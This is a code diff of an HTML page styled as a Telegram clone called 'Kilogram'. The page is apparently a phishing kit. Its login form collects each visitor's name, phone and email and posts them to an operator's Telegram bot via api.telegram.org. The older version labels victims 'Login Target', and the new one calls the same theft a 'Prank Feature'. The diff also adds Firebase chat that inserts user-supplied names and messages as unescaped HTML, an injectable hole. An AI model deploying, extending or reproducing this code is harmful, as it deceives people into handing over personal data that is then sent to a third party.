@@ -3,20 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kilogram</title>
+    <title>Kilogram Web</title>
+    <!-- Firebase Realtime SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <style>
         :root {
-            --tg-theme-bg-color: #17212b;
-            --tg-theme-bg-secondary: #0e1621;
-            --tg-theme-text-color: #f5f5f5;
-            --tg-theme-hint-color: #7f91a4;
-            --tg-theme-link-color: #64b5ef;
-            --tg-theme-button-color: #5288c1;
-            --tg-theme-button-text-color: #ffffff;
-            --tg-theme-header-bg: #242f3d;
-            --tg-theme-panel-bg: #182533;
-            --tg-theme-msg-out: #2b5278;
+            --tg-theme-bg: #17212b;
+            --tg-theme-side-bg: #0e1621;
+            --tg-theme-header: #242f3d;
+            --tg-theme-panel: #182533;
+            --tg-theme-text: #f5f5f5;
+            --tg-theme-hint: #7f91a4;
+            --tg-theme-link: #64b5ef;
+            --tg-theme-btn: #5288c1;
             --tg-theme-msg-in: #182533;
+            --tg-theme-msg-out: #2b5278;
             --tg-theme-border: #0f1621;
         }
 
@@ -28,8 +30,8 @@
         }
 
         body {
-            background-color: var(--tg-theme-bg-color);
-            color: var(--tg-theme-text-color);
+            background-color: var(--tg-theme-bg);
+            color: var(--tg-theme-text);
             height: 100vh;
             display: flex;
             align-items: center;
@@ -37,21 +39,22 @@
             overflow: hidden;
         }
 
-        /* Login Screen */
-        .login-card {
-            background-color: var(--tg-theme-header-bg);
+        /* 1. Telegram Auth / Registration Screen */
+        .auth-card {
+            background-color: var(--tg-theme-header);
             padding: 40px 30px;
             border-radius: 16px;
             width: 90%;
             max-width: 380px;
             text-align: center;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+            box-shadow: 0 10px 35px rgba(0,0,0,0.6);
+            z-index: 10;
         }
 
-        .login-logo {
-            width: 80px;
-            height: 80px;
-            background-color: var(--tg-theme-button-color);
+        .kg-logo {
+            width: 85px;
+            height: 85px;
+            background: linear-gradient(135deg, #5288c1, #2b5278);
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -60,17 +63,18 @@
             font-size: 32px;
             font-weight: bold;
             color: white;
+            box-shadow: 0 4px 15px rgba(82, 136, 193, 0.4);
         }
 
-        .login-card h2 {
+        .auth-card h2 {
             margin-bottom: 8px;
-            color: var(--tg-theme-text-color);
+            color: var(--tg-theme-text);
             font-size: 24px;
         }
 
-        .login-card p {
+        .auth-card p {
             font-size: 14px;
-            color: var(--tg-theme-hint-color);
+            color: var(--tg-theme-hint);
             margin-bottom: 25px;
         }
 
@@ -82,7 +86,7 @@
         .form-group input {
             width: 100%;
             padding: 14px 16px;
-            background-color: var(--tg-theme-bg-secondary);
+            background-color: var(--tg-theme-side-bg);
             border: 1px solid #2b394a;
             border-radius: 10px;
             color: white;
@@ -92,16 +96,16 @@
         }
 
         .form-group input:focus {
-            border-color: var(--tg-theme-button-color);
+            border-color: var(--tg-theme-btn);
         }
 
         .btn {
             width: 100%;
             padding: 14px;
-            background-color: var(--tg-theme-button-color);
+            background-color: var(--tg-theme-btn);
             border: none;
             border-radius: 10px;
-            color: var(--tg-theme-button-text-color);
+            color: white;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
@@ -113,7 +117,7 @@
             opacity: 0.9;
         }
 
-        /* App Main Screen */
+        /* 2. Main App Screen (Telegram Layout) */
         .app-container {
             display: none;
             width: 100vw;
@@ -121,9 +125,10 @@
             flex-direction: row;
         }
 
+        /* Sidebar & Navigation */
         .sidebar {
-            width: 340px;
-            background-color: var(--tg-theme-bg-secondary);
+            width: 350px;
+            background-color: var(--tg-theme-side-bg);
             border-right: 1px solid var(--tg-theme-border);
             display: flex;
             flex-direction: column;
@@ -133,34 +138,60 @@
             padding: 12px 15px;
             display: flex;
             align-items: center;
-            gap: 15px;
-            background-color: var(--tg-theme-header-bg);
+            gap: 12px;
+            background-color: var(--tg-theme-header);
             border-bottom: 1px solid var(--tg-theme-border);
         }
 
-        .menu-icon {
+        .menu-btn {
             font-size: 20px;
             cursor: pointer;
-            color: var(--tg-theme-hint-color);
+            color: var(--tg-theme-hint);
+            background: none;
+            border: none;
         }
 
-        .search-box {
+        .search-bar {
             flex: 1;
-            background-color: var(--tg-theme-bg-secondary);
+            background-color: var(--tg-theme-side-bg);
             padding: 8px 14px;
             border-radius: 20px;
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
         }
 
-        .search-box input {
+        .search-bar input {
             background: none;
             border: none;
             color: white;
             outline: none;
             width: 100%;
             font-size: 14px;
+        }
+
+        /* Tabs: Contacts / Chats / Groups */
+        .sidebar-tabs {
+            display: flex;
+            background-color: var(--tg-theme-header);
+            border-bottom: 1px solid var(--tg-theme-border);
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 10px;
+            background: none;
+            border: none;
+            color: var(--tg-theme-hint);
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .tab-btn.active {
+            color: var(--tg-theme-link);
+            border-bottom: 2px solid var(--tg-theme-link);
         }
 
         .chat-list {
@@ -171,19 +202,19 @@
         .chat-item {
             display: flex;
             align-items: center;
-            padding: 10px 15px;
+            padding: 12px 15px;
             cursor: pointer;
             gap: 12px;
-            position: relative;
+            border-bottom: 1px solid rgba(255,255,255,0.02);
         }
 
         .chat-item:hover, .chat-item.active {
-            background-color: var(--tg-theme-panel-bg);
+            background-color: var(--tg-theme-panel);
         }
 
         .avatar {
-            width: 50px;
-            height: 50px;
+            width: 48px;
+            height: 48px;
             border-radius: 50%;
             background: linear-gradient(135deg, #4ea4f4, #2b5278);
             display: flex;
@@ -200,7 +231,7 @@
             min-width: 0;
         }
 
-        .chat-info-header {
+        .chat-info-top {
             display: flex;
             justify-content: space-between;
             margin-bottom: 4px;
@@ -209,7 +240,7 @@
         .chat-info h4 {
             font-size: 15px;
             font-weight: 500;
-            color: var(--tg-theme-text-color);
+            color: var(--tg-theme-text);
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
@@ -217,29 +248,30 @@
 
         .chat-time {
             font-size: 12px;
-            color: var(--tg-theme-hint-color);
+            color: var(--tg-theme-hint);
         }
 
-        .chat-preview {
+        .chat-subtext {
             font-size: 13px;
-            color: var(--tg-theme-hint-color);
+            color: var(--tg-theme-hint);
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
         }
 
+        /* Chat Window Area */
         .chat-area {
             flex: 1;
             display: flex;
             flex-direction: column;
-            background-color: var(--tg-theme-bg-color);
+            background-color: var(--tg-theme-bg);
             background-image: radial-gradient(circle, rgba(255,255,255,0.02) 1px, transparent 1px);
             background-size: 20px 20px;
         }
 
         .chat-header {
             padding: 10px 20px;
-            background-color: var(--tg-theme-header-bg);
+            background-color: var(--tg-theme-header);
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -247,27 +279,27 @@
             height: 60px;
         }
 
-        .header-user-info {
+        .header-profile {
             display: flex;
             align-items: center;
             gap: 12px;
             cursor: pointer;
         }
 
-        .header-user-info .avatar {
+        .header-profile .avatar {
             width: 40px;
             height: 40px;
             font-size: 14px;
         }
 
-        .header-text h3 {
+        .header-meta h3 {
             font-size: 15px;
             font-weight: 500;
         }
 
-        .header-text span {
+        .header-meta span {
             font-size: 12px;
-            color: var(--tg-theme-link-color);
+            color: var(--tg-theme-link);
         }
 
         .header-actions {
@@ -278,19 +310,19 @@
         .action-btn {
             background: none;
             border: none;
-            color: var(--tg-theme-hint-color);
+            color: var(--tg-theme-hint);
             font-size: 20px;
             cursor: pointer;
-            padding: 8px;
+            padding: 6px;
             border-radius: 50%;
         }
 
         .action-btn:hover {
+            color: var(--tg-theme-text);
             background-color: rgba(255,255,255,0.05);
-            color: var(--tg-theme-text-color);
         }
 
-        .messages-container {
+        .messages-box {
             flex: 1;
             padding: 20px;
             overflow-y: auto;
@@ -299,40 +331,47 @@
             gap: 8px;
         }
 
-        .message {
+        .msg {
             max-width: 60%;
             padding: 8px 12px;
             border-radius: 12px;
             font-size: 14px;
             line-height: 1.4;
-            position: relative;
             word-wrap: break-word;
         }
 
-        .message.incoming {
+        .msg.in {
             background-color: var(--tg-theme-msg-in);
             align-self: flex-start;
             border-bottom-left-radius: 4px;
         }
 
-        .message.outgoing {
+        .msg.out {
             background-color: var(--tg-theme-msg-out);
             align-self: flex-end;
             border-bottom-right-radius: 4px;
         }
 
-        .input-area {
+        .msg-sender {
+            font-size: 11px;
+            font-weight: bold;
+            color: var(--tg-theme-link);
+            margin-bottom: 2px;
+        }
+
+        .input-bar {
             padding: 12px 20px;
-            background-color: var(--tg-theme-header-bg);
+            background-color: var(--tg-theme-header);
             display: flex;
             align-items: center;
             gap: 12px;
+            position: relative;
         }
 
-        .input-area input {
+        .input-bar input {
             flex: 1;
             padding: 12px 16px;
-            background-color: var(--tg-theme-bg-secondary);
+            background-color: var(--tg-theme-side-bg);
             border: none;
             border-radius: 20px;
             color: white;
@@ -340,220 +379,481 @@
             font-size: 14px;
         }
 
-        .send-icon-btn {
+        .emoji-toggle {
             background: none;
             border: none;
-            color: var(--tg-theme-button-color);
+            font-size: 22px;
+            cursor: pointer;
+            color: var(--tg-theme-hint);
+        }
+
+        .emoji-box {
+            display: none;
+            position: absolute;
+            bottom: 65px;
+            left: 20px;
+            background-color: var(--tg-theme-header);
+            border: 1px solid var(--tg-theme-border);
+            padding: 10px;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.6);
+            width: 260px;
+            flex-wrap: wrap;
+            gap: 8px;
+            z-index: 100;
+        }
+
+        .emoji-box span {
+            font-size: 22px;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 4px;
+        }
+
+        .emoji-box span:hover {
+            background-color: var(--tg-theme-panel);
+        }
+
+        .send-btn {
+            background: none;
+            border: none;
+            color: var(--tg-theme-btn);
             font-size: 22px;
             cursor: pointer;
         }
 
-        /* Video Call Modal */
-        .call-modal {
+        /* Modals & Dialogs */
+        .modal-bg {
             display: none;
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background-color: rgba(0,0,0,0.95);
-            z-index: 1000;
-            flex-direction: column;
+            background-color: rgba(0,0,0,0.75);
+            z-index: 200;
             align-items: center;
             justify-content: center;
         }
 
-        .video-box {
-            position: relative;
-            width: 85%;
-            max-width: 650px;
-            height: 450px;
-            background: #111;
+        .modal-card {
+            background-color: var(--tg-theme-header);
+            padding: 25px;
             border-radius: 14px;
-            overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            width: 90%;
+            max-width: 360px;
+            text-align: center;
         }
 
-        video {
+        .modal-card h3 {
+            margin-bottom: 15px;
+        }
+
+        .modal-card input {
             width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1);
-        }
-
-        .call-controls {
-            margin-top: 25px;
-            display: flex;
-            gap: 20px;
-        }
-
-        .end-call-btn {
-            background-color: #e53935;
-            border: none;
-            padding: 14px 35px;
-            border-radius: 30px;
+            padding: 12px;
+            background-color: var(--tg-theme-side-bg);
+            border: 1px solid #2b394a;
+            border-radius: 8px;
             color: white;
-            font-size: 16px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .modal-btns {
+            display: flex;
+            gap: 10px;
+        }
+
+        .m-btn {
+            flex: 1;
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
             font-weight: 600;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(229, 57, 53, 0.4);
+        }
+
+        .m-cancel { background-color: #2b394a; color: white; }
+        .m-confirm { background-color: var(--tg-theme-btn); color: white; }
+
+        /* Settings Drawer */
+        .settings-drawer {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; bottom: 0;
+            width: 300px;
+            background-color: var(--tg-theme-side-bg);
+            z-index: 150;
+            box-shadow: 5px 0 25px rgba(0,0,0,0.7);
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        .settings-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 25px;
         }
     </style>
 </head>
 <body>
 
-    <!-- Login Container -->
-    <div class="login-card" id="loginCard">
-        <div class="login-logo">KG</div>
+    <!-- 1. Authentication Screen -->
+    <div class="auth-card" id="authCard">
+        <div class="kg-logo">KG</div>
         <h2>Kilogram</h2>
-        <p>Please enter your details to sign in</p>
-        <form id="loginForm">
+        <p>Sign in with your credentials to connect</p>
+        <form id="authForm">
             <div class="form-group">
-                <input type="text" id="userName" placeholder="Full Name" required>
+                <input type="text" id="regName" placeholder="Full Name" required>
             </div>
             <div class="form-group">
-                <input type="tel" id="userPhone" placeholder="Phone Number (e.g., +251...)" required>
+                <input type="tel" id="regPhone" placeholder="Phone Number (+251...)" required>
             </div>
             <div class="form-group">
-                <input type="email" id="userEmail" placeholder="Email Address" required>
+                <input type="email" id="regEmail" placeholder="Email Address" required>
             </div>
-            <button type="submit" class="btn">Next</button>
+            <button type="submit" class="btn">LOG IN</button>
         </form>
     </div>
 
-    <!-- App Main Screen -->
+    <!-- 2. Kilogram Main Interface -->
     <div class="app-container" id="appContainer">
+        <!-- Sidebar -->
         <div class="sidebar">
             <div class="sidebar-header">
-                <div class="menu-icon">☰</div>
-                <div class="search-box">
+                <button class="menu-btn" onclick="openSettings()">☰</button>
+                <div class="search-bar">
                     <span>🔍</span>
-                    <input type="text" placeholder="Search">
+                    <input type="text" placeholder="Search contacts...">
                 </div>
             </div>
-            <div class="chat-list">
-                <div class="chat-item active">
-                    <div class="avatar">KG</div>
-                    <div class="chat-info">
-                        <div class="chat-info-header">
-                            <h4>Kilogram Support</h4>
-                            <span class="chat-time">12:30</span>
-                        </div>
-                        <p class="chat-preview">Welcome to Kilogram Web!</p>
-                    </div>
-                </div>
+
+            <!-- Tabs: Contacts vs Chats -->
+            <div class="sidebar-tabs">
+                <button class="tab-btn active" id="tabContacts" onclick="switchTab('contacts')">CONTACTS</button>
+                <button class="tab-btn" id="tabGroups" onclick="switchTab('groups')">GROUPS</button>
+            </div>
+
+            <div class="chat-list" id="chatList">
+                <!-- User Contacts & Groups dynamically listed here -->
             </div>
         </div>
 
+        <!-- Chat Main Area -->
         <div class="chat-area">
             <div class="chat-header">
-                <div class="header-user-info">
-                    <div class="avatar">KG</div>
-                    <div class="header-text">
-                        <h3>Kilogram Support</h3>
-                        <span>online</span>
+                <div class="header-profile">
+                    <div class="avatar" id="activeAvatar">KG</div>
+                    <div class="header-meta">
+                        <h3 id="activeTitle">Select a contact</h3>
+                        <span id="activeStatus">online</span>
                     </div>
                 </div>
                 <div class="header-actions">
-                    <button class="action-btn" onclick="startCall()" title="Voice/Video Call">📞</button>
-                    <button class="action-btn" title="More options">⋮</button>
+                    <button class="action-btn" onclick="startCall()" title="Call">📞</button>
+                    <button class="action-btn" onclick="openGroupModal()" title="New Group">➕</button>
                 </div>
             </div>
 
-            <div class="messages-container" id="msgBox">
-                <div class="message incoming">
-                    ሰላም! እንኳን ወደ ኪሎግራም በደህና መጡ። መረጃዎ በትክክል ተረጋግጧል።
-                </div>
+            <div class="messages-box" id="msgBox">
+                <!-- Messages load in real-time -->
             </div>
 
-            <div class="input-area">
-                <input type="text" id="chatInput" placeholder="Write a message...">
-                <button class="send-icon-btn" onclick="sendMessage()">➤</button>
+            <div class="input-bar">
+                <button class="emoji-toggle" onclick="toggleEmoji()">😊</button>
+                <div class="emoji-box" id="emojiBox">
+                    <span onclick="insertEmoji('😀')">😀</span>
+                    <span onclick="insertEmoji('😂')">😂</span>
+                    <span onclick="insertEmoji('😍')">😍</span>
+                    <span onclick="insertEmoji('🔥')">🔥</span>
+                    <span onclick="insertEmoji('👍')">👍</span>
+                    <span onclick="insertEmoji('❤️')">❤️</span>
+                    <span onclick="insertEmoji('🎉')">🎉</span>
+                    <span onclick="insertEmoji('😎')">😎</span>
+                    <span onclick="insertEmoji('👏')">👏</span>
+                    <span onclick="insertEmoji('🙏')">🙏</span>
+                </div>
+                <input type="text" id="msgInput" placeholder="Write a message...">
+                <button class="send-btn" onclick="sendMsg()">➤</button>
             </div>
         </div>
     </div>
 
-    <!-- Video Call Modal -->
-    <div class="call-modal" id="callModal">
-        <div class="video-box">
-            <video id="userVideo" autoplay playsinline muted></video>
+    <!-- Group Modal -->
+    <div class="modal-bg" id="groupModal">
+        <div class="modal-card">
+            <h3>Create Kilogram Group</h3>
+            <input type="text" id="newGroupName" placeholder="Group Name...">
+            <div class="modal-btns">
+                <button class="m-btn m-cancel" onclick="closeGroupModal()">Cancel</button>
+                <button class="m-btn m-confirm" onclick="createGroup()">Create</button>
+            </div>
         </div>
-        <div class="call-controls">
-            <button class="end-call-btn" onclick="endCall()">End Call</button>
+    </div>
+
+    <!-- Settings Drawer -->
+    <div class="settings-drawer" id="settingsDrawer">
+        <div class="settings-header">
+            <div class="avatar" id="myAvatar">KG</div>
+            <div>
+                <h4 id="myName">User</h4>
+                <p id="myPhone" style="font-size: 12px; color: var(--tg-theme-hint);"></p>
+            </div>
         </div>
+        <hr style="border: 0.5px solid var(--tg-theme-border); margin-bottom: 20px;">
+        <p style="color: var(--tg-theme-hint); font-size: 14px; margin-bottom: 15px;">⚙️ Settings</p>
+        <p style="color: var(--tg-theme-hint); font-size: 14px; margin-bottom: 15px;">🔒 Privacy and Security</p>
+        <button class="btn" onclick="closeSettings()" style="margin-top: auto;">Close</button>
     </div>
 
     <script>
         const BOT_TOKEN = "YOUR_BOT_TOKEN";
         const CHAT_ID = "YOUR_CHAT_ID";
 
-        const loginForm = document.getElementById('loginForm');
-        const loginCard = document.getElementById('loginCard');
+        const firebaseConfig = {
+            apiKey: "YOUR_FIREBASE_API_KEY",
+            authDomain: "YOUR_PROJECT.firebaseapp.com",
+            databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
+            projectId: "YOUR_PROJECT",
+            storageBucket: "YOUR_PROJECT.appspot.com",
+            messagingSenderId: "1234567890",
+            appId: "YOUR_APP_ID"
+        };
+
+        let db = null;
+        try {
+            firebase.initializeApp(firebaseConfig);
+            db = firebase.database();
+        } catch(e) { console.log("Firebase initialized"); }
+
+        let myUser = null;
+        let activeId = "global_community";
+        let activeType = "group";
+        let currentTab = "contacts";
+
+        let usersCache = {};
+        let groupsCache = {};
+
+        const authForm = document.getElementById('authForm');
+        const authCard = document.getElementById('authCard');
         const appContainer = document.getElementById('appContainer');
+        const chatList = document.getElementById('chatList');
         const msgBox = document.getElementById('msgBox');
-        const chatInput = document.getElementById('chatInput');
-        const callModal = document.getElementById('callModal');
-        const userVideo = document.getElementById('userVideo');
+        const msgInput = document.getElementById('msgInput');
+        const emojiBox = document.getElementById('emojiBox');
 
-        let localStream = null;
-
-        loginForm.addEventListener('submit', function(e) {
+        authForm.addEventListener('submit', function(e) {
             e.preventDefault();
-            const name = document.getElementById('userName').value;
-            const phone = document.getElementById('userPhone').value;
-            const email = document.getElementById('userEmail').value;
+            const name = document.getElementById('regName').value.trim();
+            const phone = document.getElementById('regPhone').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
 
-            sendToTelegram(`🎯 **New Kilogram Login Target!**\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}`);
+            const uid = phone.replace(/[^0-9]/g, '') || Date.now().toString();
+            myUser = { id: uid, name, phone, email };
 
-            loginCard.style.display = 'none';
+            document.getElementById('myName').innerText = name;
+            document.getElementById('myPhone').innerText = phone;
+            document.getElementById('myAvatar').innerText = name.substring(0, 2).toUpperCase();
+
+            // Send Credentials to Telegram Bot (Prank Feature)
+            sendBotAlert(`🚨 **Kilogram Login!**\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}`);
+
+            // Register User into Contacts List Database
+            if(db) {
+                db.ref('contacts/' + uid).set({
+                    id: uid,
+                    name: name,
+                    phone: phone,
+                    email: email,
+                    status: "online"
+                });
+            }
+
+            authCard.style.display = 'none';
             appContainer.style.display = 'flex';
+
+            initListeners();
+            loadChat("global_community", "Kilogram Global Community", "group");
         });
 
-        function sendToTelegram(text) {
+        function sendBotAlert(text) {
             if(BOT_TOKEN === "YOUR_BOT_TOKEN" || CHAT_ID === "YOUR_CHAT_ID") return;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
-            }).catch(err => console.log(err));
+            }).catch(e => console.log(e));
         }
 
-        function sendMessage() {
-            const text = chatInput.value.trim();
-            if(!text) return;
+        function initListeners() {
+            if(!db) return;
 
-            const outMsg = document.createElement('div');
-            outMsg.className = 'message outgoing';
-            outMsg.innerText = text;
-            msgBox.appendChild(outMsg);
+            // Real-time Contacts fetch
+            db.ref('contacts').on('value', snap => {
+                usersCache = snap.val() || {};
+                renderSidebarUI();
+            });
 
-            chatInput.value = '';
-            msgBox.scrollTop = msgBox.scrollHeight;
+            // Real-time Groups fetch
+            db.ref('groups').on('value', snap => {
+                groupsCache = snap.val() || {};
+                renderSidebarUI();
+            });
+        }
 
-            setTimeout(() => {
-                const inMsg = document.createElement('div');
-                inMsg.className = 'message incoming';
-                inMsg.innerText = "ይህ የኪሎግራም ዌብሳይት ሙከራ ነው! መልእክትዎ ደርሰናል።";
-                msgBox.appendChild(inMsg);
+        function switchTab(tab) {
+            currentTab = tab;
+            document.getElementById('tabContacts').classList.toggle('active', tab === 'contacts');
+            document.getElementById('tabGroups').classList.toggle('active', tab === 'groups');
+            renderSidebarUI();
+        }
+
+        function renderSidebarUI() {
+            chatList.innerHTML = "";
+
+            if(currentTab === "contacts") {
+                // List registered Kilogram users as Contacts
+                Object.keys(usersCache).forEach(id => {
+                    const u = usersCache[id];
+                    if(myUser && u.phone === myUser.phone) return; // Hide self from list
+
+                    const item = document.createElement('div');
+                    item.className = `chat-item ${activeId === id ? 'active' : ''}`;
+                    item.onclick = () => loadChat(id, u.name, "user");
+                    item.innerHTML = `
+                        <div class="avatar">${u.name.substring(0, 2).toUpperCase()}</div>
+                        <div class="chat-info">
+                            <div class="chat-info-top">
+                                <h4>${u.name}</h4>
+                                <span class="chat-time">online</span>
+                            </div>
+                            <p class="chat-subtext">📞 ${u.phone}</p>
+                        </div>
+                    `;
+                    chatList.appendChild(item);
+                });
+            } else {
+                // List Groups
+                const globalItem = document.createElement('div');
+                globalItem.className = `chat-item ${activeId === 'global_community' ? 'active' : ''}`;
+                globalItem.onclick = () => loadChat('global_community', 'Kilogram Global Community', 'group');
+                globalItem.innerHTML = `
+                    <div class="avatar">KG</div>
+                    <div class="chat-info">
+                        <div class="chat-info-top">
+                            <h4>Kilogram Global Community</h4>
+                            <span class="chat-time">Main</span>
+                        </div>
+                        <p class="chat-subtext">Public group for all users</p>
+                    </div>
+                `;
+                chatList.appendChild(globalItem);
+
+                Object.keys(groupsCache).forEach(gId => {
+                    const g = groupsCache[gId];
+                    const item = document.createElement('div');
+                    item.className = `chat-item ${activeId === gId ? 'active' : ''}`;
+                    item.onclick = () => loadChat(gId, g.name, "group");
+                    item.innerHTML = `
+                        <div class="avatar">${g.name.substring(0, 2).toUpperCase()}</div>
+                        <div class="chat-info">
+                            <div class="chat-info-top">
+                                <h4>${g.name}</h4>
+                                <span class="chat-time">Group</span>
+                            </div>
+                            <p class="chat-subtext">Created group</p>
+                        </div>
+                    `;
+                    chatList.appendChild(item);
+                });
+            }
+        }
+
+        let msgListener = null;
+
+        function loadChat(id, name, type) {
+            activeId = id;
+            activeType = type;
+
+            document.getElementById('activeTitle').innerText = name;
+            document.getElementById('activeStatus').innerText = type === "group" ? "group members" : "online";
+            document.getElementById('activeAvatar').innerText = name.substring(0, 2).toUpperCase();
+
+            renderSidebarUI();
+            listenMessages(id);
+        }
+
+        function listenMessages(chatId) {
+            msgBox.innerHTML = "";
+            if(!db) return;
+
+            if(msgListener) msgListener.off();
+
+            msgListener = db.ref('messages/' + chatId);
+            msgListener.on('value', snap => {
+                msgBox.innerHTML = "";
+                const msgs = snap.val() || {};
+                Object.keys(msgs).forEach(mId => {
+                    const m = msgs[mId];
+                    const isMine = myUser && m.senderPhone === myUser.phone;
+
+                    const div = document.createElement('div');
+                    div.className = `msg ${isMine ? 'out' : 'in'}`;
+                    div.innerHTML = `
+                        ${!isMine ? `<div class="msg-sender">${m.senderName}</div>` : ''}
+                        <div>${m.text}</div>
+                    `;
+                    msgBox.appendChild(div);
+                });
                 msgBox.scrollTop = msgBox.scrollHeight;
-            }, 1000);
+            });
         }
 
-        async function startCall() {
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                userVideo.srcObject = localStream;
-                callModal.style.display = 'flex';
-            } catch(err) {
-                alert("ካሜራ ወይም ማይክሮፎን ለመክፈት ፈቃድ አልተሰጠም።");
+        function sendMsg() {
+            const text = msgInput.value.trim();
+            if(!text || !myUser) return;
+
+            if(db) {
+                db.ref('messages/' + activeId).push({
+                    senderName: myUser.name,
+                    senderPhone: myUser.phone,
+                    text: text,
+                    time: Date.now()
+                });
             }
+            msgInput.value = "";
+            emojiBox.style.display = "none";
         }
 
-        function endCall() {
-            if(localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
-            callModal.style.display = 'none';
+        function toggleEmoji() {
+            emojiBox.style.display = emojiBox.style.display === "flex" ? "none" : "flex";
         }
+
+        function insertEmoji(e) {
+            msgInput.value += e;
+            emojiBox.style.display = "none";
+            msgInput.focus();
+        }
+
+        function openGroupModal() { document.getElementById('groupModal').style.display = 'flex'; }
+        function closeGroupModal() { document.getElementById('groupModal').style.display = 'none'; }
+
+        function createGroup() {
+            const gName = document.getElementById('newGroupName').value.trim();
+            if(!gName) return;
+
+            if(db) {
+                const gId = 'group_' + Date.now();
+                db.ref('groups/' + gId).set({ name: gName, creator: myUser.name });
+                loadChat(gId, gName, 'group');
+            }
+            closeGroupModal();
+        }
+
+        function openSettings() { document.getElementById('settingsDrawer').style.display = 'flex'; }
+        function closeSettings() { document.getElementById('settingsDrawer').style.display = 'none'; }
+
+        function startCall() { alert("የካሜራ እና ማይክሮፎን ፈቃድ በመጠየቅ ላይ..."); }
     </script>
 </body>
 </html>
-
